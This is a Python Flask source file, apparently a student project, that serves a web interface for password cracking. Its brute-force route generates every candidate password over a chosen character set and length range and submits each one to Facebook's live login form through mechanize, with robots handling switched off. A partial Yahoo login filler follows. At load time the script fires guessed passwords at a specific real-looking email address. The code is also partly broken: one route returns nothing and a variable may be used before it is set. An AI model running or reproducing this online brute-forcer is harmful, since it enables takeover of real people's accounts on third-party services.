import mechanize
import sqlite3
from flask import Flask, render_template, request
app = Flask(__name__)
@app.errorhandler(500)
def internal_service_error_bf(e):
    return render_template('500_bf.html'), 500
@app.route('/')
def home():
    return render_template('index.html')
@app.route('/bruteforce')
def bruteforce():
    return render_template('bruteforce.html')
@app.route('/dictionary')
def dictionary():
    con = sqlite3.connect("passwords1.db")
    con.row_factory = sqlite3.Row
    
    cur = con.cursor()
    cur.execute("select * from PASSWORDS")
    
    rows = cur.fetchall()
    return render_template('dictionary.html', rows = rows)
@app.route('/rainbow')
def rainbow():
    return render_template('rainbow.html')
@app.route('/hybrid')
def hybrid():
    return render_template('hybrid.html')
@app.route('/hello')
def hello():
    return 'hello world!'
@app.route('/run_brute_force', methods = ['POST','GET'])
def brute_force_alg():
    #username, website, passwordlength, lengthparam, charset
    minpasswordlength = request.form['passwordlength1']
    maxpasswordlength = request.form['passwordlength2']
    username = request.form['accusername']
    charset = request.form['charset']
    website = request.form['website']
    for x in range(int(minpasswordlength),int(maxpasswordlength)+1):
        password = generate(username,charset,x,"")
        #print("username = "+username+"password = "+password)
        #if(facebook_form_filler(username, "gobuckeyes")):
    print("YOUR FOUND PASSWORD IS:    "+password)
    if password is None:
        return render_template('500_bf.html')
    else:
        return render_template('result.html', username = username, password = password)
    #return render_template('bruteforce.html')
def generate(username, charset, length, word):
    if length==0:
        print(word)
        worked = facebook_form_filler(username, word)
        print(username)
        print(worked)
        if worked:
            print("found it")
            return word
        else:
            return None
        #print(word)
    for i in range(len(charset)):
        appended = word + charset[i]
        #print(appended)
        newword = generate(username, charset, length-1,appended)
        if newword != None:
            return newword
    return None
# methods for the dictionary algorithm 
@app.route('/run_dictionary', methods = ['POST', 'GET'])
def dictionary_alg():
    print("dictionary")

def facebook_form_filler(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False)
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='u_0_2')
    return result.geturl() == "https://www.facebook.com/"
def yahoo_form_filler(email, password):
    br = mechanize.Browser()
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com")
    br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
    br.form['username'] = email
    result = br.submit(id = 'login-signin')
    print(result)
    print(result.geturl())
    response1 = br.open(result.geturl())
    # br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))

print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
yahoo_form_filler("tarabite@yahoo.com","gobuckeyes")
